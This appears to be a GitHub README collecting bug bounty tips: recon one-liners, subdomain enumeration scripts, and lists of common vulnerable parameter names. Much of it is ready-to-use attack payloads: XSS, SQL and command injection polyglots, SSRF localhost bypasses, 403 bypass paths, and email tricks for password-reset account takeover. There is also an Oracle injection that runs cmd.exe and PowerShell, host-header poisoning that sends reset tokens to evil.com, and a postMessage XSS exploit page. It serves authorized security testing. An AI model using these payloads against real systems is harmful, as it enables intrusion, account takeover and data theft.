# BugBounty Tips	
Collection of `#bugbountytips` from twitter and my bash-jutsu.
# Recon
```
Google the company copyright footer to get more domains.
Use whoxy.com to perform reverse whois lookups with the email used to register the main domain/
Search for slide,docs,demos and video tutorials by your target. Manny innocent examples could leak juicy endpoints.
Use OpenSSL to get certificates. They can contain valuable info and common names form finding more subdomains.
Try to recreate data from deleted accounts by siging up with the old email address.
Check text version of HTML e-mail for template injections
When testing Rails Application add .json to url endpoints.
cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
curl http://host.xx/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"* 
grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/
check *.cloudapp.azure.com subdomains for possible development instances of applications. (ex: companyname-appname.eastus.cloudapp.azure.com) (also check subdomains in different regions ex: westus instead of eastus)
```

# Subdomain Enumeration
```
sublist3r -d $1 -o $1.txt
mkdir thirdlevel
echo "Gathering full third-level domain with sublister"
for domain in $(cat $1.txt); do sublist3r -d $domain -o thirdlevel/$domain.txt; cat thirdlevel/$domain.txt | sort -u >> final.txt; done 
echo "Probing for alive third-levels..."
cat final.txt | httprobe > probed.txt
```

# subdomain level extraction
|Regex pattern	|Domain level match|
| ------ | ------ |
|grep -P '^(?:[a-z0-9]+\.){1}[^.]*$'	|2nd level domains only|
|grep -P '^(?:[a-z0-9]+\.){2}[^.]*$'	|3rd level domains only|
|grep -P '^(?:[a-z0-9]+\.){2,}[^.]*$'	|3rd level domains or higher|
|grep -P '^(?:[a-z0-9]+\.){2,3}[^.]*$'	|3rd to 4th level domains only|
|grep -P '^(?:[a-z0-9]+\.){3,}[^.]*$'	|4th level domains or higher|

# Check live 
```
cat GREPABLENMAP.gnmap | grep 443/open | cut -d "(" -f 1 | cut -d : -f 2| tr -d " " | sed -E 's#https?://##I' | sed -E 's#/.*##' | sed -E 's#^\*\.?##' | sed -E 's#,#\n#g' | tr '[:upper:]' '[:lower:]' | uniq | sed -e 's/^/https:\/\//' | httpx -silent -timeout 2 -threads 100 -status-code -mc 200,302 |anew 
```
# Check live webapps from sublis3r
```
cat subdomains.txt | sed -E 's#https?://##I' | sed -E 's#/.*##' | sed -E 's#^\*\.?##' | sed -E 's#,#\n#g' | tr '[:upper:]' '[:lower:]' | uniq | sed -e 's/^/https:\/\//' | httpx -silent -timeout 2 -threads 100 -status-code -mc 200,302 |anew 
```
# Filter ffuf output
```
cat * | jq | grep "url\"" | grep -v "replayproxyurl" |grep -v "proxyurl"  | grep -v "FUZZ" | cut -d \" -f4
```

# Tools
```
Use exiftool to extract metadata from documents, it might reveal vulnerable htmltopdf generators
Use cloud_enum to find open google buckets or azure accounts 
Use Grep to extract endpoints with grep: grep -o -E '(https?://)?/?[{}a-z0-9A-Z_\.-]{2,}/[{}/a-z0-9A-Z_\.-]+'
Use WayBackmachine combined with paraminer or parameth
Passive parameter mining web.archive.org /cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey
```

# Payloads
```
Inject payloads in parameter names, ?<script>alerty</script>=true
Use youtube(olx, etc...) videos with xss in names.
Use round brackets to inject payload into valid e-mail address.
X-Forwarded-For: ${payload}
Use longstring parameters for stacktrace.
WAFBYPASS ?page=";confirm`1`//   Rightwards -> 302; ?pag%65=";confirm`1`//   Rightwards -> 200 + XSS!
Redirect bypass %26next=http://example.com 
When testing nodejs site add %ff at the end of url https://target.com/%ff, most of times cause error and return stacktrace with full path
Add [] to name of parrameter: pwd= ->pwd[]=
when interacting with db try to put % in parameter  ?item=%
```

# Authentication & Autorization 
```
UUID Idor Trick, Register user with the same name, it maybe return uuid.
Try to bruteforce login endpoint. /login/${oauth_provider}, login/facebook, login/oauth/twitter login/oauth/v2/yahoo
403 Forbidden bypass, https://host.com/path =403, https://host.com/%2e/path = 200, 
Bypass paywalls by using Google Bot user agent.
User securitytrails.com to find the originating server IP
Do match and replace form false to true.
Set your birthday for today ot tomorrow to get discounts.
Skip steps: /step/shipping ->  ~~/step/payment~~ -> /step/confirm
Check does blackfriday coupon codes expires.
Use blind xss as password.
Login to site using Facebook and try tochange userid during POST requests
/api/v1/users/profile?id=MYID&id=ANOTHERUSERID -> HTTP 200 
```
# Email Restriction bypass
```
inti(;inti@inti.io;)@whitelisted.com

→ inti(;
→ inti@inti.io → my inbox!
→ ;)@whitelisted.com
● inti@inti.io(@whitelisted.com)
● inti+(@whitelisted.com;)@inti.io
```

# Email Address input fuzz
```
test+(<script>alert(1)</script>)@example.com
test@example(<script>alert(1)</script>).com
"<script>alert(1)</script>"@example.com

"<%=7*7%>"@example.com
test+(${{7*7}})@example.com

"'OR 1=1--"@example.com
"mail');DROP TABLE users;--"@example.com

test@example.burpcollaborator.net
test@[127.0.0.1]

victim&email=attacker@example.com

"%0d%0aContent-Lenght:%200@0d%0a%0d%0a"@example.com"recipient@test.com>\r\nRCPT TO:<victim+"@test.com
```
# Account takeover via Email 
```
GET /passwordreset

Double parameter (aka. HPP / HTTP parameter pollution):
email=victim@xyz.tld&email=hacker@xyz.tld
Carbon copy:
email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld
Using separators:
email=victim@xyz.tld,hacker@xyz.tld
email=victim@xyz.tld%20hacker@xyz.tld
email=victim@xyz.tld|hacker@xyz.tld
No domain:
email=victim
No TLD (Top Level Domain):
email=victim@xyz
JSON table:
{"email":["victim@xyz.tld","hacker@xyz.tld"]}
```
# Password Reset:
```
reset userpassword: user@email.com.burpcolaborator.com
```
# Find GET parameters in example.com
```
assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done
```

# Command injection polyglot
```
/*$(ping -c 2 example.com)`ping -c 2 example.com``*/-ping -c 2 example.com-'/*$(ping -c 2 example.com)`ping -c 2 example.com` #*/-ping -c 2 example.com||'"||ping -c 2 example.com||"/*`*/
/*$(echo 1 >/tmp/rce1)`echo 1 >/tmp/rce1``*/-echo 1 >/tmp/rce1-'/*$(echo 1 >/tmp/rce1)`echo 1 >/tmp/rce1` #*/-echo 1 >/tmp/rce1||'"||echo 1 >/tmp/rce1||"/*`*/
|echo lol2137||a #' |echo lol2137||a #|" |echo lol2137||a #
||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
||`ping -c 21 grb0fhwh3gg8b9g0nbeqddobp2vsjh.burpcollaborator.net` #' |ping -n 21 grb0fhwh3gg8b9g0nbeqddobp2vsjh.burpcollaborator.net||`ping -c 21 grb0fhwh3gg8b9g0nbeqddobp2vsjh.burpcollaborator.net` #\" |ping -n 21 grb0fhwh3gg8b9g0nbeqddobp2vsjh.burpcollaborator.net
||`dig grb0fhwh3gg8b9g0nbeqddobp2vsjh.burpcollaborator.net` #' |dig grb0fhwh3gg8b9g0nbeqddobp2vsjh.burpcollaborator.net||`dig grb0fhwh3gg8b9g0nbeqddobp2vsjh.burpcollaborator.net` #\" |dig grb0fhwh3gg8b9g0nbeqddobp2vsjh.burpcollaborator.net
$(sleep 21)
```
# SSRF Bypass list for localhost (127.0.0.1):
```
http://127.1/
http://0000::1:80/
http://[::]:80/
http://2130706433/
http://whitelisted@127.0.0.1
http://0x7f000001/
http://017700000001
http://0177.00.00.01
```

# Top 25 SSRF parameters
```
?dest={target}
?redirect={target}
?uri={target}
?path={target}
?continue={target}
?url={target}
?window={target}
?next={target}
?data={target}
?reference={target}
?site={target}
?html={target}
?val={target}
?validate={target}
?domain={target}
?callback={target}
?return={target}
?page={target}
?feed={target}
?host={target}
?port={target}
?to={target}
?out={target}
?view={target}
?dir={target}
```
# Top 25 RCE parameters
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
# Top 25 LFI parameters
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```

# HackerOne redirect parameters
```
/[redirect]
?targetOrigin=[redirect]
?fallback=[redirect]
?query=[redirect]
?redirection_url=[redirect]
?next=[redirect]
?ref_url=[redirect]
?state=[redirect]
?l=[redirect]
?redirect_uri=[redirect]
?forum_reg=[redirect]
?return_to=[redirect]
?redirect_url=[redirect]
?return_url=[redirect]
?host=[redirect]
?url=[redirect]
?redirectto=[redirect]
?return=[redirect]
?prejoin_data=[redirect]
?callback_url=[redirect]
?path=[redirect]
?authorize_callback=[redirect]
?email=[redirect]
?origin=[redirect]
?continue=[redirect]
?domain_name=[redirect]
?redir=[redirect]
?wp_http_referer=[redirect]
?endpoint=[redirect]
?shop=[redirect]
?qpt_question_url=[redirect]
?checkout_url=[redirect]
?ref_url=[redirect]
?redirect_to=[redirect]
?succUrl=[redirect]
?file=[redirect]
?link=[redirect]
?referrer=[redirect]
?recipient=[redirect]
?redirect=[redirect]
?u=[redirect]
?hostname=[redirect]
?returnTo=[redirect]
?return_path=[redirect]
?image=[redirect]
?requestTokenAndRedirect=[redirect]
?retURL=[redirect]
?next_url=[redirect]
```

# MORE PARAMETERS
https://github.com/1ndianl33t/Gf-Patterns

# Massive XSS
```
#!/bin/bash
# $1 => example.domain

subfinder -d $1 -o domains_subfinder_$1
amass enum --passive -d $1 -o domains_$1

cat domains_subfinder_$1 | tee -a domains_$1
cat domains_$1 | filter-resolved | tee -a domains_$1.txt

cat domains_$1.txt | ~/go/bin/httprobe -p http:81 -p http:8080 -p https:8443 | waybackurls | kxss | tee xss.txt
```
# Masive Top Parameters search
```
TBA 
echo "http://tesla.com" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
```
# Juicy GoogleDorks
```
site:example.com inurl:.cgi?
```
# File Upload and what to search
```
ASP / ASPX / PHP5 / PHP / PHP3: Webshell / RCE
SVG: Stored XSS / SSRF / XXE
GIF: Stored XSS / SSRF
CSV: CSV injection
XML: XXE
AVI: LFI / SSRF
HTML / JS : HTML injection / XSS / Open redirect
PNG / JPEG: Pixel flood attack (DoS)
ZIP: RCE via LFI / DoS
PDF / PPTX: SSRF / BLIND XXE
```
# File upload chain
```
../../../tmp/lol.png —> for path traversal
sleep(10)-- -.jpg —> for SQL injection
<svg onload=alert(document.domain)>.jpg/png —> for XSS
; sleep 10; —> for command injections
```
# Find JavaScript Files in Target.com
```
echo target.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
or
cat domains | httpx -silent | subjs | anew
```
# Extract endpoints from \*.js 
```
cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u
```
# Extract juicy data from js  
```
cat hosts | httpx -silent | subjs | anew | httpx -silent -sr -mc 200 
grep -EHirn "accesskey|admn|aes|api_key|apikey|password|secret|token" ./output --color

```
# 403 bypass
```
https://target.com/admin/ –> HTTP 302 (redirect to login page)
https://target.com/admin..;/ –> HTTP 200 OK

https://target.com/../admin
https://target.com/whatever/..;/admin

site.com/secret –> HTTP 403 Forbidden
site.com/secret/ –> HTTP 200 OK
site.com/secret/. –> HTTP 200 OK
site.com//secret// –> HTTP 200 OK
site.com/./secret/.. –> HTTP 200 OK

X-Original-URL: /admin
X-Override-URL: /admin
X-Rewrite-URL: /admin

/accessible/..;/admin
/.;/admin
/admin;/
/admin/~
/./admin/./
/admin?param
/%2e/admin
/admin#

```
# Data leakage through .json
```
Here’s a tip to achieve sensitive data leak using .json extension.

Request:
GET /ResetPassword HTTP/1.1
{"email":"victim@example.com"}

Response:
HTTP/1.1 200 OK
Now let’s try this instead:

Request:
GET /ResetPassword.json HTTP/1.1
{"email":"victim@example.com"}

Response:
HTTP/1.1 200 OK
{"success":"true","token":"596a96-cc7bf-9108c-d896f-33c44a-edc8a"}
```
# Generate wordlist for target
```
echo "bugcrowd.com" | subfinder -silent | hakrawler -plain -usewayback -scope yolo | sed $'s/[./?=:&#]/\\n/g' | anew
```

# Check for SQLi
```
/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q[]=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||'  <== concat string
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='
```
# SQLi in Email parameter

| Payload | Response |Injection Status |
| ------ | ------ |------ |
|{“email”:”asd@a.com”}| {“code”:2002,”status”:200,”message”:”Email not found.”}|	Valid|
|{“email”:”asd a@a.com”}|	{“code”:2002,”status”:200,”message”:”Bad format”}|	Not Valid|	
|{“email”:”\”asd a\”@a.com”}|	{“code”:2002,”status”:200,”message”:”Bad format”}|	Not Valid|	
|{“email”:”asd(a)@a.com”}|	{“code”:2002,”status”:200,”message”:”Bad format”}|	Not Valid|	
|{“email”:”\”asd(a)\”@a.com”}|	{“code”:2002,”status”:200,”message”:”Email not found.”}|	Valid|	
|{“email”:”asd’a@a.com”}|	{“code”:0,”status”:500,”message”:”Unspecified error”}|	Not Valid|	
|{“email”:”asd’or’1’=’1@a.com”}|	{“code”:2002,”status”:200,”message”:”Email not found.”}	Valid|	
|{“email”:”a’-IF(LENGTH(database())>9,SLEEP(7),0)or’1’=’1@a.com”}|	{“code”:2002,”status”:200,”message”:”Bad format”}|	Not Valid|
|{“email”:”\”a’-IF(LENGTH(database())>9,SLEEP(7),0)or’1’=’1\”@a.com”}|	{“code”:0,”status”:200,”message”:”Successful”}|	Valid	Delay: 7,854 milis|
|{“email”:”\”a’-IF(LENGTH(database())=10,SLEEP(7),0)or’1’=’1\”@a.com”}|	{“code”:0,”status”:200,”message”:”Successful”}|	Valid	Delay: 8,696 milis|
|{“email”:”\”a’-IF(LENGTH(database())=11,SLEEP(7),0)or’1’=’1\”@a.com”}|	{“code”:0,”status”:200,”message”:”Successful”}|	Valid	No delay|

### Oracle
```
1) UNION SELECT CASE WHEN (SELECT ASCII(SUBSTR((SELECT user FROM dual), 1, 1 )) FROM dual) >71 THEN (dbms_pipe.receive_message(('a'),10)) ELSE NULL END FROM dual --
1' AND 1=2 UNION SELECT SYS.KUPP$PROC.CREATE_MASTER_PROCESS('DBMS_SCHEDULER.create_program(''exec4'',''EXECUTABLE'',''c:\\WINDOWS\\system32\\cmd.exe /c type C:\\users\\public\\shell.ps1 | PowerShell.exe -noprofile - '',0,TRUE);DBMS_SCHEDULER.create_job(job_name=>''myjob11'',program_name=>''exec4'',start_date=>NULL,repeat_interval=>NULL,end_date=>NULL,enabled=>TRUE,auto_drop=>TRUE);dbms_lock.sleep(1);dbms_scheduler.drop_program(program_name=>''exec4'');dbms_scheduler.purge_log;'), null  FROM DUAL --
1' AND 1=1 UNION SELECT null, user FROM DUAL --
```


### Cool BurpPlugins
```
Autorize – To test BACs (Broken Access Control)
Burp Bounty – Profile-based scanner
Active Scan++ – Add more power to Burp’s Active Scanner
AuthMatrix – Authorization/PrivEsc checks
Broken Link Hijacking – For BLH (Broken Link Hijacking)
Collaborator Everywhere – Pingback/SSRF (Server-Side Request Forgery)
Command Injection Attacker
Content-Type Converter – Trying to bypass certain restrictions by changing Content-Type
Decoder Improved – More decoder features
Freddy – Deserialization
Flow – Better HTTP history
Hackvertor – Handy type conversion
HTTP Request Smuggler
Hunt – Potential vuln identifier
InQL – GraphQL Introspection testing
J2EE Scan – Scanning J2EE apps
JSON/JS Beautifier
JSON Web Token Attacker
ParamMiner – Mine hidden parameters
Reflected File Download Checker
Reflected Parameter – Potential reflection
SAML Raider – SAML testing
Upload Scanner – File upload tester
Web Cache Deception Scanner
```
# Detect framework via favico
```
cat urls.txt | python3 favfreak.py -o output
```

### Password Poisoning
```
(1) Normal request:

Request:
POST /password-reset?user=123 HTTP/1.1
Host: target.com
Link received:
https://target.com/reset-link=1g2f3guy23g
(2) Basic HHI (Host Header Injection):

Request:
POST /password-reset?user=123 HTTP/1.1
Host: evil.com
Link received:
none
Error 404 - request blocked
(3) Bypass technique:

Request:
POST https://target.com/password-reset?user=123 HTTP/1.1
Host: evil.com
Link received:
https://evil.com/reset-link=1g2f3guy23g
```
### Find hostsname form given IP

```
echo 192.168.69.69 | cero
```

### XSS Post Message POC
```
Vulnerable PostMessage
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script>
window.addEventListener("message", (event) => {
console.log(event.data);
$(event.data)
}, false);
</script>


Exploit 
<!DOCTYPE html>
<html>
    <head>
    </head>
<body>
<script>
var myWindow = window.open("http://example.com/test.html")
</script>
<script>
setInterval(function(){myWindow.postMessage("<img src=x onerror=alert(123);>","*");},3000);
window.onmessage = function (e) {
console.log(e);
};
</script>
</body>
</html>
```
### Deserialization 
```
https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/
https://github.com/tyranid/ExploitRemotingService
https://github.com/nccgroup/VulnerableDotNetHTTPRemoting
https://github.com/pwntester/ysoserial.net/blob/master/README.md
https://nickbloor.co.uk/2018/02/28/popping-wordpress/
```
### From Path Traversal to Source Code in Asp.NET MVC Applications
```
https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html
https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/
http://bit.ly/2NDZc73
```
### Hacking IIS
```
https://www.youtube.com/watch?v=HrJW6Y9kHC4
```
### Reference
https://gowsundar.gitbook.io/book-of-bugbounty-tips/
https://soroush.secproject.com/blog/


### Random
```
https://regex-generator.olafneumann.org/
https://regex101.com/
```
